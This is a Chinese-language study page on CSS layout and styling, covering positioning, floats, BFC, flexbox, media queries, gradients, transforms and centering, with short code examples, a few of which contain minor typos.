<p>一个块级元素会新开始一行并且尽可能撑满容器，常用的块级元素： <code>div</code>、 <code>p</code> 、 <code>form</code> 、 <code>header</code> 、 <code>footer</code> 、 <code>section</code> 等等。</p>
<p>一个行内元素可以在段落中包裹一些文字而不会打乱段落的布局，常用的块级元素：<code>span</code>、<code>a</code>，常见的例子是：把 <code>li</code> 元素修改成 inline，制作成水平菜单。</p>
<h3 id="margin-0-auto"><a href="#margin-0-auto" class="headerlink" title="margin: 0 auto;"></a>margin: 0 auto;</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#main</span> &#123;</span><br><span class="line">  <span class="attribute">max-width</span>: <span class="number">600px</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="盒子模型"><a href="#盒子模型" class="headerlink" title="盒子模型"></a>盒子模型</h3><p><code>box-sizing: border-box;</code> 元素的内边距和边框不再会增加它的宽度。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">* &#123;</span><br><span class="line">  -webkit-<span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">     -moz-<span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">          <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="定位-position"><a href="#定位-position" class="headerlink" title="定位(position)"></a>定位(position)</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">postion: static;    <span class="comment">/*默认值，不会被&quot;positioned&quot;*/</span></span><br><span class="line"><span class="attribute">position</span>: relative; <span class="comment">/*相对定位(表现的和static一样，除非添加了一些额外的属性)*/</span></span><br><span class="line"><span class="attribute">position</span>: fixed;    <span class="comment">/*相对视窗定位,top,right,bottom和left属性均可用*/</span></span><br><span class="line"><span class="attribute">position</span>: absolute; <span class="comment">/*绝对定位*/</span></span><br><span class="line"><span class="attribute">position</span>: sticky;   <span class="comment">/*粘滞定位*/</span></span><br></pre></td></tr></table></figure>

<h4 id="相对定位"><a href="#相对定位" class="headerlink" title="相对定位"></a>相对定位</h4><ul>
<li>元素开启相对定位后，如果不设置偏移量（offset），元素不会发生任何变化。</li>
<li>相对定位是参照于元素在文档流中的位置进行定位的</li>
<li>相对定位会提升元素的层级</li>
<li>相对定位不会使元素脱离文档流</li>
<li>相对定位不会改变元素的性质</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.relative</span>&#123;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">top</span>: -<span class="number">20px</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">20px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">500px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>top</code> , <code>left</code> , <code>right</code> , <code>bottom</code> 属性会使偏离其正常位置，其他的元素的位置则不会受该元素的影响发生位置改变来弥补它偏离后剩下的空隙。</p>
<h4 id="绝对定位"><a href="#绝对定位" class="headerlink" title="绝对定位"></a>绝对定位</h4><ul>
<li>开启绝对定位后，如果不设置偏移量，元素的位置不会发生变化</li>
<li>开启绝对定位后，元素会从文档流中脱离</li>
<li>绝对定位会改变元素的性质，行内变成块，块的宽高被内容撑开</li>
<li>绝对定位会使元素提升一个层级</li>
<li>绝对定位元素是相对于其包含块进行定位的<ul>
<li>包含块<ul>
<li>正常情况下，包含块就是离当前元素最近的祖先<strong>块元素</strong></li>
<li>绝对定位情况下，包含块就是离它最近的开启了定位的祖先元素（position值不是static）</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>水平布局：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="attribute">left</span> + <span class="attribute">margin-left</span> + <span class="attribute">border-left</span> + <span class="attribute">padding-left</span> + <span class="attribute">width</span> + <span class="attribute">padding-right</span> + <span class="attribute">border-right</span> + <span class="attribute">margin-right</span> + <span class="attribute">right</span> = 包含块宽度</span><br></pre></td></tr></table></figure>

<ul>
<li><p>开启绝对定位后，水平方向布局需要添加<code>left</code>和<code>right</code>两个值，当发生过度约束，如果值中没有<code>auto</code>则自动调整<code>right</code>值使等式满足</p>
</li>
<li><p>可设置<code>auto</code>的值：</p>
<p><code>margin</code>，<code>width</code>，<code>left</code>，<code>right</code></p>
</li>
<li><p>因为 <code>left</code> 和<code>right</code> 的默认值是 <code>auto</code>，所以如果不知道 left 和 right ，则等式不满足时，会自动调整这两个值</p>
</li>
</ul>
<h4 id="固定定位"><a href="#固定定位" class="headerlink" title="固定定位"></a>固定定位</h4><ul>
<li>固定定位也是一种绝对定位，大部分特点和绝对定位一样。唯一不同的是固定定位永远参照于浏览器的视窗进行定位</li>
</ul>
<p>移动浏览器对 <code>fixed</code> 的支持很差。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.relative</span> &#123;</span><br><span class="line"> 	<span class="attribute">position</span>: relative;</span><br><span class="line"> 	<span class="attribute">width</span>: <span class="number">600px</span>;</span><br><span class="line"> 	<span class="attribute">height</span>: <span class="number">400px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.absolute</span> &#123;</span><br><span class="line"> 	<span class="attribute">position</span>: absolute;</span><br><span class="line"> 	<span class="attribute">top</span>: <span class="number">120px</span>;</span><br><span class="line">	<span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">	<span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line"> 	<span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>absolute</code> 与 <code>fixed</code> 的表现类似，但是它不是相对于视窗而是相对于<em>最近的 “positioned” 祖先元素</em>。如果绝对定位（position属性的值为absolute）的元素没有 “positioned” 祖先元素，那么它是相对于文档的 body 元素，并且它会随着页面滚动而移动。记住一个 “positioned” 元素是指 position 值不是 <code>static</code> 的元素。</p>
<p><strong><code>fixed</code> 定位不能存在有 <code>translate</code> 操作的 div 中，否则会失效。</strong></p>
<h4 id="粘滞定位"><a href="#粘滞定位" class="headerlink" title="粘滞定位"></a>粘滞定位</h4><ul>
<li>粘滞定位和相对定位特点基本一致，不同的是粘滞定位可以在到达某个位置时将其固定</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="attribute">position</span>: sticky;</span><br><span class="line"><span class="attribute">top</span>: <span class="number">0</span>;</span><br></pre></td></tr></table></figure>



<h3 id="浮动"><a href="#浮动" class="headerlink" title="浮动"></a>浮动</h3><ul>
<li>元素设置浮动以后，水平布局的等式边不需要强制成立</li>
<li>元素设置成浮动以后，会完全从文档流中脱离，不在占用文档流的位置</li>
<li>浮动元素默认不会从父元素中移出</li>
<li>浮动元素向左或向右移动时，不会超过它前面的浮动元素</li>
<li>浮动元素不会盖住文字，文字会自动环绕在浮动元素的周围</li>
</ul>
<p><strong>float</strong></p>
<p>float可用于实现文字环绕图片</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">img</span> &#123;</span><br><span class="line"> 	<span class="attribute">float</span>: right;</span><br><span class="line"> 	<span class="attribute">margin</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">1em</span> <span class="number">1em</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>clear</strong></p>
<p>控制浮动</p>
<ul>
<li>作用：清除浮动元素对当前元素所产生的影响</li>
<li>原理：设置清除浮动后，浏览器会自动为元素添加一个上外边距，以使其元素不受其他元素的影响</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">    <span class="attribute">float</span>: left;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">1em</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.after-box</span> &#123;</span><br><span class="line">    <span class="attribute">clear</span>: left; <span class="comment">/*清除左浮动*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box&quot;</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">&quot;after-box&quot;</span>&gt;</span>...<span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="高度坍塌"><a href="#高度坍塌" class="headerlink" title="高度坍塌"></a>高度坍塌</h4><ul>
<li>在浮动布局中，父元素的高度默认是被子元素撑开的</li>
<li>当子元素发动后，其会完全脱离文档流，子元素从文档流中脱离，将无法撑起父元素的高度，导致父元素的高度丢失</li>
<li>父元素高度丢失以后，其下的元素会自动上移，导致页面布局混乱，所以高度坍塌是浮动布局中比较常见的一个问题。</li>
</ul>
<h4 id="BFC"><a href="#BFC" class="headerlink" title="BFC"></a>BFC</h4><p>BFC（Block Formatting Context）块级格式化环境</p>
<ul>
<li><p>BFC是CSS中的一个隐含的属性，可以为一个元素开启BFC，开启BFC后该元素会变成一个独立的布局区域</p>
</li>
<li><p>元素开启BFC后的特点：</p>
<ul>
<li>开启BFC的元素不会被浮动元素所覆盖</li>
<li>开启BFC的元素子元素和父元素外边距不会重叠</li>
<li>开启BFC的元素可以包含浮动的子元素</li>
</ul>
</li>
<li><p>可以通过一些特殊方式来开启元素的BFC：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.inner</span>&#123;</span><br><span class="line">    <span class="attribute">float</span>: left;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>设置元素的浮动（不推荐）</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.outer</span>&#123;</span><br><span class="line">    <span class="attribute">float</span>: left;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>将元素设置为行内块元素（不推荐）</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.outer</span>&#123;</span><br><span class="line">    <span class="attribute">display</span>: inline-block;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>将元素的overflow设置为一个非visible的值</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.outer</span>&#123;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h4 id="使用-after伪类解决高度塌陷"><a href="#使用-after伪类解决高度塌陷" class="headerlink" title="使用::after伪类解决高度塌陷"></a>使用::after伪类解决高度塌陷</h4><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box1</span><span class="selector-pseudo">::after</span>&#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="attribute">display</span>: block;</span><br><span class="line">    <span class="attribute">clear</span>: both;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="clearfix-解决高度塌陷和外边距重叠"><a href="#clearfix-解决高度塌陷和外边距重叠" class="headerlink" title="clearfix 解决高度塌陷和外边距重叠"></a>clearfix 解决高度塌陷和外边距重叠</h4><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.clearfix</span><span class="selector-pseudo">::before</span>, </span><br><span class="line"><span class="selector-class">.clearfix</span><span class="selector-pseudo">::after</span>&#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="attribute">display</span>: table;</span><br><span class="line">    <span class="attribute">clear</span>: both;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="弹性盒"><a href="#弹性盒" class="headerlink" title="弹性盒"></a>弹性盒</h3><ul>
<li><p>flex（弹性盒、伸缩盒）</p>
<ul>
<li><p>是CSS中的又一种布局手段，它主要是用来代替浮动来完成页面的布局</p>
</li>
<li><p>flex可以使元素具有弹性，让元素可以跟随页面的大小的改变而改变</p>
</li>
<li><p>弹性容器</p>
<ul>
<li><p>要使用弹性盒，必须先将一个元素设置为弹性容器</p>
</li>
<li><p>我们通过display来设置弹性容器</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="attribute">display</span>: flex;        // 设置为块级弹性容器</span><br><span class="line"><span class="attribute">display</span>: inline-flex; // 设置为行内弹性容器</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>弹性元素</p>
<ul>
<li>弹性容器的子元素是弹性元素（弹性项）</li>
<li>一个元素可以同时是弹性容器和弹性元素</li>
</ul>
</li>
<li><p><code>flex-direction</code> 指定容器中弹性元素的排列方式</p>
<ul>
<li>row 默认值，水平排列（从左向右）</li>
<li>row-reverse 反向水平排列</li>
<li>column 纵向排列（自上向下）</li>
<li>column-reverse 反向纵向排列</li>
</ul>
</li>
<li><p>主轴：</p>
<ul>
<li>弹性元素的排列方向称为主轴</li>
</ul>
</li>
<li><p>侧轴：</p>
<ul>
<li>与主轴垂直方向的称为侧轴</li>
</ul>
</li>
</ul>
</li>
<li><p><code>flex-grow</code> 指定弹性元素的伸展的系数</p>
<ul>
<li>当父元素有多余空间时，子元素如何伸展</li>
<li>父元素的剩余空间，会按照比例进行分配</li>
</ul>
</li>
<li><p><code>flex-shrink</code> 指定弹性元素的收缩系数</p>
<ul>
<li>当父元素中的空间不足以容纳所有的子元素时，如何对子元素进行收缩</li>
</ul>
</li>
<li><p><code>flex-wrap</code> 设置弹性元素是否在弹性容器中自动换行</p>
<ul>
<li>nowrap 默认值，元素不会自动换行</li>
<li>wrap 元素沿着辅轴方向自动换行</li>
</ul>
</li>
<li><p><code>justify-content</code> 如何分配主轴上的空白空间（主轴上的元素如何排列）</p>
<ul>
<li>flex-start  元素沿着主轴起边排列</li>
<li>flex-end 元素沿着主轴终边排列</li>
<li>center 元素居中排列</li>
<li>space-around 空白分布到元素两侧</li>
<li>space-between 空白均匀分布到元素间</li>
</ul>
</li>
<li><p><code>align-items</code> 元素在辅轴上如何对齐</p>
<ul>
<li>元素间的关系<ul>
<li>stretch 默认值 将元素的长度设置为相同的值</li>
<li>flex-start 元素不会拉伸，沿着辅轴起边对齐</li>
<li>flex-end 沿着辅轴的终边对齐</li>
<li>center 居中对齐</li>
<li>baseline 基线对齐</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">ul</span>&#123;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">flex</span>-firection: row;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">li</span>&#123;</span><br><span class="line">    <span class="attribute">flex-grow</span>: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">li</span><span class="selector-pseudo">:nth-child</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="attribute">flex-grow</span>: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">li</span><span class="selector-pseudo">:nth-child</span>(<span class="number">2</span>)&#123;</span><br><span class="line">    <span class="attribute">flex-grow</span>: <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">li</span><span class="selector-pseudo">:nth-child</span>(<span class="number">3</span>)&#123;</span><br><span class="line">    <span class="attribute">flex-grow</span>: <span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="像素"><a href="#像素" class="headerlink" title="像素"></a>像素</h3><ul>
<li>屏幕是由一个个发光的小点构成的，一个点就是一个像素</li>
<li>分辨率 说的就是屏幕中点的数量</li>
<li>在前端开发中像素要分两种情况讨论：<strong>CSS像素</strong>和<strong>物理像素</strong></li>
<li>默认情况下，在PC端，一个CSS像素 &#x3D; 一个物理像素</li>
<li>不同的屏幕，单位像素的大小是不同的，像素越小屏幕会越清晰</li>
<li>智能手机的像素点远远小于计算机的像素点</li>
<li>默认情况下，移动端的网页都会将视口设置为980像素（CSS像素）<ul>
<li>确保PC端网页可以在移动端正常访问，但是如果网页的宽度超过980px，浏览器会自动最网页缩放以完整显示网页</li>
</ul>
</li>
</ul>
<h3 id="百分比宽度"><a href="#百分比宽度" class="headerlink" title="百分比宽度"></a>百分比宽度</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">img</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">50%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="响应式"><a href="#响应式" class="headerlink" title="响应式"></a>响应式</h3><ul>
<li>网页可以根据不同的设备或窗口大小呈现出不同的效果</li>
<li>使用响应式布局，可以使一个网页适用于所有设备</li>
<li>相应布局的关键是媒体查询<ul>
<li>媒体查询语法: <code>@media</code> 查询规则<code>&#123;&#125;</code><ul>
<li>all	所有设备</li>
<li>print 打印设备</li>
<li>screen 带屏幕设备</li>
<li>speech 屏幕阅读器</li>
</ul>
</li>
</ul>
</li>
<li>样式切换的分界点，我们称其为断点，也就是网页的样式会在这个点时发生变化<ul>
<li>一般常用的断点：<ul>
<li>小于768 超小屏幕 max-width&#x3D;768px</li>
<li>大于768 小屏幕 min-width&#x3D;768px</li>
<li>大于992 中型屏幕 min-width&#x3D;992px</li>
<li>大于1200 大屏幕 min-width&#x3D;1200px</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">min-width</span>:<span class="number">600px</span>) &#123;</span><br><span class="line">  <span class="selector-tag">nav</span> &#123;</span><br><span class="line">    <span class="attribute">float</span>: left;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">25%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-tag">section</span> &#123;</span><br><span class="line">    <span class="attribute">margin-left</span>: <span class="number">25%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">max-width</span>:<span class="number">599px</span>) &#123;</span><br><span class="line">  <span class="selector-tag">nav</span> <span class="selector-tag">li</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: inline;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">media</span>=<span class="string">&quot;screen and (max-width: 700px)&quot;</span> <span class="attr">href</span>=<span class="string">&quot;css/index_max_700.css&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>





<h3 id="inline-block"><a href="#inline-block" class="headerlink" title="inline-block"></a>inline-block</h3><p>创建很多网格来铺满浏览器</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">1em</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="column"><a href="#column" class="headerlink" title="column"></a>column</h3><p>文字多列布局</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.three-column</span> &#123;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">1em</span>;</span><br><span class="line">  -moz-<span class="attribute">column-count</span>: <span class="number">3</span>;</span><br><span class="line">  -moz-<span class="attribute">column-gap</span>: <span class="number">1em</span>;</span><br><span class="line">  -webkit-<span class="attribute">column-count</span>: <span class="number">3</span>;</span><br><span class="line">  -webkit-<span class="attribute">column-gap</span>: <span class="number">1em</span>;</span><br><span class="line">  <span class="attribute">column-count</span>: <span class="number">3</span>;</span><br><span class="line">  <span class="attribute">column-gap</span>: <span class="number">1em</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="flexbox"><a href="#flexbox" class="headerlink" title="flexbox"></a>flexbox</h3><p>使用 Flexbox 的居中布局</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.vertical-container</span> &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">display</span>: -webkit-flex;</span><br><span class="line">  <span class="attribute">display</span>:         flex;</span><br><span class="line">  -webkit-<span class="attribute">align-items</span>: center;</span><br><span class="line">          <span class="attribute">align-items</span>: center;</span><br><span class="line">  -webkit-<span class="attribute">justify-content</span>: center;</span><br><span class="line">          <span class="attribute">justify-content</span>: center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="渐变"><a href="#渐变" class="headerlink" title="渐变"></a>渐变</h2><ul>
<li>线性渐变<ul>
<li>开头可指定渐变方向<ul>
<li>to left</li>
<li>to right</li>
<li>to bottom</li>
<li>to top</li>
<li>xx deg deg表示度数</li>
<li>turn 表示圈</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*向右渐变*/</span></span><br><span class="line"><span class="attribute">background</span>: <span class="built_in">linear-gradient</span>(to right, 颜色<span class="number">1</span>, 颜色<span class="number">2</span>);</span><br><span class="line"><span class="comment">/*向上渐变*/</span></span><br><span class="line"><span class="attribute">background</span>: <span class="built_in">linear-gradient</span>(to top, <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>), <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>));</span><br></pre></td></tr></table></figure>

<ul>
<li>径向渐变（放射性效果）</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="attribute">background</span>: <span class="built_in">radial-gradient</span>();</span><br></pre></td></tr></table></figure>

<h3 id="对半颜色"><a href="#对半颜色" class="headerlink" title="对半颜色"></a>对半颜色</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="attribute">background</span>: <span class="built_in">linear-gradient</span>(to right, red <span class="number">50%</span>, blue <span class="number">50%</span>);</span><br></pre></td></tr></table></figure>



<h2 id="2D移动"><a href="#2D移动" class="headerlink" title="2D移动"></a>2D移动</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*demo: 向右移动10px, 向下移动5px*/</span></span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">translate</span>(<span class="number">10px</span>, <span class="number">5px</span>);</span><br></pre></td></tr></table></figure>



<h2 id="2D旋转"><a href="#2D旋转" class="headerlink" title="2D旋转"></a>2D旋转</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*旋转25度*/</span></span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">skewX</span>(<span class="number">25deg</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">rotateZ</span>(<span class="number">360deg</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*是否显示元素背面*/</span></span><br><span class="line"><span class="attribute">backface-visibility</span>: hidden;</span><br></pre></td></tr></table></figure>



<h2 id="盒子前置"><a href="#盒子前置" class="headerlink" title="盒子前置"></a>盒子前置</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*z-index 在z轴上的位置,值越大位置越靠前*/</span></span><br><span class="line"><span class="attribute">z-index</span>: <span class="number">100</span>;</span><br><span class="line"><span class="attribute">position</span>: relative;</span><br></pre></td></tr></table></figure>



<h2 id="透明度"><a href="#透明度" class="headerlink" title="透明度"></a>透明度</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*透明度40%*/</span></span><br><span class="line"><span class="attribute">opacity</span>:<span class="number">0.4</span>;</span><br></pre></td></tr></table></figure>



<h2 id="阴影"><a href="#阴影" class="headerlink" title="阴影"></a>阴影</h2><p>box-shadow</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span>&#123;</span><br><span class="line">    <span class="attribute">box-shadow</span>: <span class="number">0px</span> <span class="number">0px</span> <span class="number">50px</span> <span class="number">5px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, .<span class="number">3</span>);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    	第一个值 水平偏移量</span></span><br><span class="line"><span class="comment">    	第二个值 垂直偏移量</span></span><br><span class="line"><span class="comment">    	第三个值 阴影的模糊半径</span></span><br><span class="line"><span class="comment">    	第四个值 阴影的大小</span></span><br><span class="line"><span class="comment">    	第五个值 阴影的颜色</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="圆角"><a href="#圆角" class="headerlink" title="圆角"></a>圆角</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span>&#123;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">30px</span>;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    	设置圆角，设置的圆的半径大小</span></span><br><span class="line"><span class="comment">    	border-radius: 1px 2px 3px 4px;</span></span><br><span class="line"><span class="comment">    	左上角，右上角，右下角，左下角。(顺时针)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">50%</span>;<span class="comment">/*设置成圆角*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="溢出部分隐藏"><a href="#溢出部分隐藏" class="headerlink" title="溢出部分隐藏"></a>溢出部分隐藏</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="attribute">overflow</span>: hidden;</span><br></pre></td></tr></table></figure>



<h2 id="间距"><a href="#间距" class="headerlink" title="间距"></a>间距</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*字间距*/</span></span><br><span class="line"><span class="attribute">letter-spacing</span>: <span class="number">1px</span>;</span><br><span class="line"><span class="comment">/*行高*/</span></span><br><span class="line"><span class="attribute">line-height</span>:<span class="number">30px</span>;</span><br></pre></td></tr></table></figure>



<h2 id="禁用指针样式"><a href="#禁用指针样式" class="headerlink" title="禁用指针样式"></a>禁用指针样式</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">pointer-envents: none;</span><br></pre></td></tr></table></figure>

<h2 id="居中"><a href="#居中" class="headerlink" title="居中"></a>居中</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*整体水平居中*/</span></span><br><span class="line"><span class="selector-tag">body</span>&#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*水平 垂直居中*/</span></span><br><span class="line"><span class="attribute">position</span>: absolute;</span><br><span class="line"><span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line"><span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">translate</span>(-<span class="number">50%</span>, -<span class="number">50%</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*相对于父元素垂直居中*/</span></span><br><span class="line"><span class="attribute">position</span>: relative;</span><br><span class="line"><span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">translateY</span>(-<span class="number">50%</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="attribute">display</span>: flex;</span><br><span class="line"><span class="attribute">justify-content</span>: center;</span><br><span class="line"><span class="attribute">align-items</span>: center;</span><br></pre></td></tr></table></figure>

<h2 id="默认样式清除"><a href="#默认样式清除" class="headerlink" title="默认样式清除"></a>默认样式清除</h2><h3 id="超链接a"><a href="#超链接a" class="headerlink" title="超链接a"></a>超链接a</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="attribute">text-decoration</span>: none; <span class="comment">/*清除文本样式 如下划线*/</span></span><br></pre></td></tr></table></figure>

<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:link</span>&#123;	<span class="comment">/*未访问的超链接*/</span></span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:visited</span>&#123;	<span class="comment">/*访问过的超链接*/</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">a</span>, <span class="selector-tag">a</span><span class="selector-pseudo">:visited</span>&#123;</span><br><span class="line">  <span class="attribute">text-decoration</span>: none;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#333</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

